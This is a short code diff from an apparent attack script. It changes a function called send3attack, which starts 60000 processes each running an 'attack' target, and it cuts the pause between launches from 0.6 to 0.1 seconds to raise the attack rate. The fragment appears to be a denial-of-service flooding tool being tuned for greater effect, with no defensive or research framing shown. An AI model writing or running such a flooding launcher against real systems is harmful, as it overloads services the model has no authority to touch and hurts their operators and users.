@@ -89,10 +89,8 @@ def send3attack():
   for i in range(60000): 
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = True
-    mp.setDaemon = True
-    mp.setDaemon = True
     mp.start() 
-    sleep(0.6)
+    sleep(0.1)
 	
 send3attack()
 exit(1)
